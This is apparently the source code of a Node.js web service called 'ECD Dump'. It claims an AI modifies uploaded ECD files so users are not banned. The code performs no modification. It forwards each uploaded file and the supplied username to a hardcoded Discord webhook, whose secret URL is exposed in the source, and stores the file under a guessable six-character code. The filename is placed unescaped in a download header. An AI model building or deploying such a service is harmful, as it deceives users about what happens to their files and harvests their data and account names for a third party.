const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// In-memory storage for 6-character code retrieval
const fileStore = new Map();

// Updated Discord Webhook URL
const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Helper function to generate random 6-character alphanumeric code
function generateCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Main HTML User Interface with animations, info modal, and username input
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ECD Dump</title>
        <style>
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            @keyframes pulseGlow {
                0% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
                50% { box-shadow: 0 0 25px rgba(56, 189, 248, 0.5); }
                100% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
            }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); 
                color: #f8fafc; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                height: 100vh; 
                margin: 0; 
                overflow: hidden;
            }
            .container { 
                background: rgba(30, 41, 59, 0.85); 
                backdrop-filter: blur(12px);
                padding: 35px; 
                border-radius: 16px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.6); 
                width: 400px; 
                text-align: center; 
                animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite ease-in-out;
                border: 1px solid rgba(255, 255, 255, 0.08);
                position: relative;
            }
            .info-icon {
                position: absolute;
                top: 15px;
                left: 15px;
                background: rgba(51, 65, 85, 0.6);
                color: #38bdf8;
                width: 28px;
                height: 28px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                font-size: 14px;
                cursor: pointer;
                transition: all 0.3s ease;
                border: 1px solid rgba(56, 189, 248, 0.3);
            }
            .info-icon:hover {
                background: #38bdf8;
                color: #0f172a;
                transform: scale(1.1);
            }
            h2 { 
                margin-top: 5px;
                margin-bottom: 20px; 
                color: #38bdf8; 
                letter-spacing: 1px;
                font-size: 26px;
                text-transform: uppercase;
                background: linear-gradient(90deg, #38bdf8, #818cf8);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            h3 {
                font-size: 15px;
                color: #94a3b8;
                margin-bottom: 10px;
                letter-spacing: 0.5px;
            }
            input, button { 
                width: 100%; 
                padding: 12px; 
                margin: 10px 0; 
                border-radius: 8px; 
                border: none; 
                box-sizing: border-box; 
                font-size: 14px;
                transition: all 0.3s ease;
            }
            input[type="file"] { 
                background: #334155; 
                color: #cbd5e1; 
                cursor: pointer;
            }
            input[type="text"] {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                text-align: center;
            }
            input[name="code"] {
                letter-spacing: 2px;
                text-transform: uppercase;
            }
            input[type="text"]:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            button { 
                background: linear-gradient(135deg, #0284c7, #2563eb); 
                color: white; 
                font-weight: bold; 
                cursor: pointer; 
                box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
            }
            button:hover { 
                background: linear-gradient(135deg, #0369a1, #1d4ed8);
                transform: translateY(-2px);
                box-shadow: 0 6px 15px rgba(2, 132, 199, 0.5);
            }
            .section { 
                margin-bottom: 20px; 
                border-bottom: 1px solid rgba(51, 65, 85, 0.6); 
                padding-bottom: 15px; 
            }
            /* Modal Styles */
            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(15, 23, 42, 0.8);
                backdrop-filter: blur(5px);
                display: flex;
                justify-content: center;
                align-items: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                z-index: 100;
            }
            .modal-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }
            .modal-content {
                background: #1e293b;
                padding: 30px;
                border-radius: 14px;
                width: 330px;
                text-align: left;
                border: 1px solid rgba(56, 189, 248, 0.2);
                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
                transform: scale(0.9);
                transition: transform 0.3s ease;
                position: relative;
            }
            .modal-overlay.active .modal-content {
                transform: scale(1);
            }
            .modal-content h3 {
                color: #38bdf8;
                margin-top: 0;
                font-size: 18px;
                text-align: center;
                border-bottom: 1px solid #334155;
                padding-bottom: 10px;
            }
            .modal-content p {
                font-size: 13px;
                line-height: 1.5;
                color: #cbd5e1;
                margin: 10px 0;
            }
            .close-btn {
                position: absolute;
                top: 12px;
                right: 15px;
                background: none;
                border: none;
                color: #94a3b8;
                font-size: 18px;
                cursor: pointer;
                width: auto;
                padding: 0;
                margin: 0;
            }
            .close-btn:hover {
                color: #f8fafc;
                transform: none;
                box-shadow: none;
            }
            .footer-credit {
                margin-top: 12px;
                font-size: 11px;
                color: #64748b;
                border-top: 1px dashed rgba(51, 65, 85, 0.5);
                padding-top: 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>ECD Dump</h2>
            
            <div class="section">
                <h3>Dump ECD</h3>
                <form action="/upload-discord" method="POST" enctype="multipart/form-data">
                    <input type="text" name="username" placeholder="dbl user" required>
                    <input type="file" name="file" required>
                    <button type="submit">Upload & Get Code</button>
                </form>
            </div>

            <div>
                <h3>Retrieve File</h3>
                <form action="/retrieve" method="POST">
                    <input type="text" name="code" placeholder="ENTER CODE" maxlength="6" required>
                    <button type="submit">Download File</button>
                </form>
            </div>
        </div>

        <!-- Info Popup Modal -->
        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About ECD Dump</h3>
                <p><strong>Welcome to ecd dump.</strong><br>A place where you can dump your ecd files so it doesn't bans you and allows you to edit inner files.</p>
                <p><strong>How it works?</strong><br>We change the code inside the file with our special ai. With that we edit it like that way so it doesn't sends packages to game, apps or websites.</p>
                <p style="color: #38bdf8; font-style: italic;">Free for now will be paid in future to support development.</p>
                <div class="footer-credit">
                    Created by: @levi__fxz on discord, instagram and eren__lx on X
                </div>
            </div>
        </div>

        <script>
            function toggleModal() {
                const modal = document.getElementById('infoModal');
                modal.classList.toggle('active');
            }
            function outsideClick(event) {
                const modal = document.getElementById('infoModal');
                if (event.target === modal) {
                    modal.classList.remove('active');
                }
            }
        </script>
    </body>
    </html>
  `);
});

// Handle Upload, Validation, Discord Forwarding, and Code Generation
app.post('/upload-discord', upload.single('file'), async (req, res) => {
  try {
    const file = req.file;
    const username = req.body.username ? req.body.username.trim() : 'Unknown';

    if (!file) {
      return res.status(400).send('<h3>No file uploaded. <a href="/">Go Back</a></h3>');
    }

    // Validate filename format: ecd followed by numbers (case-insensitive for 'ecd')
    const filenameRegex = /^ecd\d+/i;
    if (!filenameRegex.test(file.originalname)) {
      return res.status(400).send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Invalid File Format</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .container { background: #1e293b; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); }
                h2 { color: #ef4444; margin-top: 0; }
                p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
                a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
                a:hover { color: #7dd3fc; text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Failed to Dump</h2>
                <p>Make sure it's a valid ECD file format (e.g., <code>ecd123.extension</code>).</p>
                <p>If it's a genuine ECD file and you are facing issues, please contact us!</p>
                <a href="/">← Go Back</a>
            </div>
        </body>
        </html>
      `);
    }

    // Generate unique 6-character retrieval code
    let code = generateCode();
    while (fileStore.has(code)) {
      code = generateCode();
    }

    // Save file buffer and metadata in memory map
    fileStore.set(code, {
      filename: file.originalname,
      buffer: file.buffer
    });

    // Forward file to Discord webhook with username included
    const formData = new FormData();
    formData.append('file', file.buffer, { filename: file.originalname });
    formData.append('payload_json', JSON.stringify({ 
      content: `📦 **New File Uploaded**\n👤 Username: \`${username}\`\nFilename: \`${file.originalname}\`\nRetrieval Code: \`${code}\`` 
    }));

    const response = await fetch(DEFAULT_WEBHOOK_URL, {
      method: 'POST',
      body: formData,
      headers: {
        ...formData.getHeaders()
      }
    });

    if (response.ok) {
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Upload Success</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .container { background: #1e293b; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); }
                h2 { color: #22c55e; margin-top: 0; }
                .code-box { background: #0f172a; padding: 15px; border-radius: 8px; font-size: 26px; letter-spacing: 3px; color: #38bdf8; margin: 20px 0; font-weight: bold; border: 1px solid #334155; user-select: all; }
                a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; transition: color 0.2s; }
                a:hover { color: #7dd3fc; text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Success!</h2>
                <p>Your file has been saved and sent to Discord.</p>
                <p>Use this 6-character code to retrieve it later:</p>
                <div class="code-box">${code}</div>
                <a href="/">← Upload Another File</a>
            </div>
        </body>
        </html>
      `);
    } else {
      const errorText = await response.text();
      console.error('Discord Error Response:', errorText);
      res.status(500).send(`<h3>Failed to dispatch file to Discord webhook (Status ${response.status}). Check Render logs for details. <a href="/">Go Back</a></h3>`);
    }
  } catch (err) {
    console.error('Upload Error:', err);
    res.status(500).send('<h3>Server error during upload. Check Render logs. <a href="/">Go Back</a></h3>');
  }
});

// Retrieve file endpoint using the 6-character code
app.post('/retrieve', (req, res) => {
  const code = req.body.code ? req.body.code.trim().toUpperCase() : '';
  const fileData = fileStore.get(code);
  
  if (!fileData) {
    return res.status(404).send('<h3>File not found or code has expired. <a href="/">Go Back</a></h3>');
  }

  res.setHeader('Content-Disposition', `attachment; filename="${fileData.filename}"`);
  res.send(fileData.buffer);
});

// Bind dynamically to Render's assigned port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is live and running on port ${PORT}`);
});
           
